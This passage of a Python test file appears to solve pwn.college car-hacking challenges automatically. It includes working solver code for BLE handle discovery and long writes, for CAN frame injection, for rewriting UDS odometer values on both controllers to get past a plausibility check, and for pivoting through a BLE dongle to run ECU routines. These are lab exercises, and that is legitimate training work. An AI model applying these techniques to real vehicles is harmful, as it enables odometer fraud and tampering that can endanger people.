            except ble.ATTError:
                continue
            if value.startswith(b"pwn.college{"):
                found = handle
                print(value.decode())
                break
        assert found is not None
        assert found not in discovered, "the handle was in the discovery response after all"
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "hidden-handles", session=session, flag=flag)


def test_ble_long_write(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "long-write", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("41:d7:6c:8b:20:5f")
        characteristics = {uuid: handle for _, _, handle, uuid in client.characteristics()}
        command = client.read(characteristics[0xFF03])
        assert len(command) > ble.DEFAULT_MTU - 3, "the command fits in one write"

        # one Write Request cannot carry it, so it must be queued and committed
        client.write_long(characteristics[0xFF01], command)
        print(client.read(characteristics[0xFF02]).decode())
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "long-write", session=session, flag=flag)


def test_dbc(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "dbc", user=user, session=session)
    output = workspace_python("""
        import cantools

        database = cantools.database.load_file("/challenge/vehicle.dbc")
        message = database.get_message_by_name("BCM_Command")
        payload = message.encode({
            "SeatHeaterLevel": 0,
            "MirrorFoldRequest": 0,
            "CabinTargetTemp": 30.5,
            "VentFanSpeed": 11,
        })

        listener = vcan.Bus("vcan0")
        sender = vcan.Bus("vcan0")

        def press():
            while True:
                sender.send(message.frame_id, payload)
                time.sleep(0.2)

        threading.Thread(target=press, daemon=True).start()
        print(flag_from_bus(listener))
    """, user=user)
    flag = solved(output)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "dbc", session=session, flag=flag)


def test_odometer(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "odometer", user=user, session=session)
    output = workspace_python("""
        import isotp

        bus = vcan.Bus("vcan0")

        def uds(address, payload):
            return isotp.request(bus, address, address + 8, bytes(payload))

        def mileage(address):
            return int.from_bytes(uds(address, [0x22, 0xF1, 0xA2])[3:7], "big")

        assert uds(0x7E0, [0x2E, 0xF1, 0xA2, 0, 0, 0x9C, 0x40])[2] == 0x22, \
            "the cluster wrote mileage in the default session"

        original = mileage(0x7E0)
        assert mileage(0x7E1) == original, "the controllers disagreed to begin with"

        # rewriting one of them is exactly what the plausibility check catches
        uds(0x7E0, [0x10, 0x03])
        uds(0x7E0, [0x2E, 0xF1, 0xA2, 0, 0, 0x9C, 0x40])
        assert b"IMPLAUSIBLE" in uds(0x7E0, [0x22, 0xF1, 0xA3]), "a lone rewrite went unnoticed"

        uds(0x7E1, [0x10, 0x03])
        uds(0x7E1, [0x2E, 0xF1, 0xA2, 0, 0, 0x9C, 0x40])
        verdict = uds(0x7E0, [0x22, 0xF1, 0xA3])[3:].decode()
        print(verdict.split(" ", 1)[1])
    """, user=user)
    flag = solved(output)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "odometer", session=session, flag=flag)


def test_capstone_pivot(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "capstone", "pivot", user=user, session=session)

    # the vehicle bus is not the attacker's to open
    with pytest.raises(subprocess.CalledProcessError):
        workspace_run("timeout 3 candump -n 1 vcan0", user=user)

    output = ble_python("""
        client = ble.Client("c4:be:84:20:11:07")
        characteristics = {uuid: handle for _, _, handle, uuid in client.characteristics()}
        client.subscribe(cccd_of(client))
        transmit = characteristics[0xFFF2]

        def send(can_id, payload):
            client.write(transmit, f"{can_id:03X}#{payload.hex().upper()}".encode())

        def uds(request, timeout=4.0):
            send(0x6F2, bytes([len(request)]) + request + bytes(7 - len(request)))
            payload = bytearray()
            total = None
            for _, value in client.events_stream(timeout=timeout):
                can_id, _, body = value.decode().partition("#")
                if int(can_id, 16) != 0x6FA:
                    continue
                data = bytes.fromhex(body)
                kind = data[0] >> 4
                if kind == 0x0:
                    return data[1:1 + (data[0] & 0x0F)]
                if kind == 0x1 and total is None:
                    total = ((data[0] & 0x0F) << 8) | data[1]
                    payload += data[2:8]
                    send(0x6F2, bytes([0x30, 0x00, 0x00]) + bytes(5))
                elif kind == 0x2 and total is not None:
                    payload += data[1:]
                if total is not None and len(payload) >= total:
                    return bytes(payload[:total])
            raise AssertionError("no response through the dongle")

        assert uds(bytes([0x3E, 0x00]))[0] == 0x7E
        assert uds(bytes([0x31, 0x01, 0xC0, 0x01]))[2] == 0x22, "the routine ran without a session"
        assert uds(bytes([0x10, 0x03]))[0] == 0x50
        response = uds(bytes([0x31, 0x01, 0xC0, 0x01]), timeout=6)
        assert response[0] == 0x71, response.hex()
        print(response[4:].decode())
    """, user=user)

    flag = solved(output)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "capstone", "pivot", session=session, flag=flag)

